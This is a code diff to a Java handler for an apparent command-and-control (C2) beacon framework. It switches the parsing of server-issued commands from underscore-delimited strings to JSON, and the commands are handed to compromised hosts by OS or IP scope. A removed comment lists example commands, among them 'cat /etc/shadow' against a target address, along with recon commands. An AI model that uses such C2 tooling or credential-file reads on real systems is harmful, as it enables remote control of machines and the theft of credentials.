@@ -5,6 +5,8 @@ import java.net.NoRouteToHostException;
 import java.net.Socket;
 import java.security.SecureRandom;
 
+import org.json.JSONObject;
+
 import Servers.Duplexer;
 import Servers.keepAlive;
 import Servers.encryption.aes.*;
@@ -88,16 +90,12 @@ public class BeaconC2Handler implements Runnable{
             }
         } else {
             /**
-             * Commands from the C2 Server are organized by two attributes
-             * Type - Command
+             * Commands from the C2 Server are defined by 3 attributes
+             * Verb - Command
              * Scope - Windows, Linux, or IPv4 Address
+             * Command - what command to run
              * 
-             * Examples
-             * 
-             * Command Windows_Get-LocalUser
-             * Status All
-             * Command Linux_whoami
-             * Command 10.0.10.x_cat /etc/shadow
+             * All of this data is sent from the C2 server in a JSON formatted string
              */
 
             // The C2 Server will start the connection by sending its public key.
@@ -163,18 +161,13 @@ public class BeaconC2Handler implements Runnable{
                         keepAliveClass.stopKeepAlive();
                         break;
                     }
-                    String[] tokensAndCommands = message.split("_");
-                    String[] tokens = tokensAndCommands[0].split(" ");
-                    String verb = tokens[0];
-                    String scope = tokens[1];
-                    String commands = "";
-                    for(int i = 1; i < tokensAndCommands.length; i++){
-                        if(i != 1){
-                            commands += "_";
-                        }
-                        commands += tokensAndCommands[i];
-                    }
-                    if(verb.equals("Command")){
+                    // parse through json formatted string
+                    JSONObject commandJSON = new JSONObject(message);
+                    String verb = commandJSON.get("verb").toString();
+                    String scope = commandJSON.get("scope").toString();
+                    String commands = commandJSON.get("command").toString();
+
+                    if(verb.equals("command")){
                         // If a message is a command, it will be in the format "Command [Scope - Windows, Linux, or IPv4 Address]_[Powershell/Bash command to be run]"
                         beaconServer.distributeCommands(scope, commands);
                     }
